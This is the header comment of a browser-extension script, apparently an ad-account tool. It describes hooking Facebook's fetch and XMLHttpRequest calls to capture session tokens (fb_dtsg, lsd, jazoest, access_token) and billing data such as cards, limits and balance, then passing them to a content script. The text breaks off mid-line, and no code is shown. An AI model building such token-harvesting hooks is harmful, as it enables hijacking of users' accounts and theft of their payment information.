// ============================================================
//  DSL Sync — Page-world hook (v2.0.0) — SMIT-style
//  Runs in MAIN world (page JS context). Intercepts every
//  fetch / XMLHttpRequest the Facebook page itself makes,
//  captures fb_dtsg / lsd / jazoest / access_token and the
//  raw GraphQL responses for the billing page (cards, limits,
//  threshold, balance, total spending).
//  All captures are forwarded to the isolated content script
//  via window.postMessage({ source: "d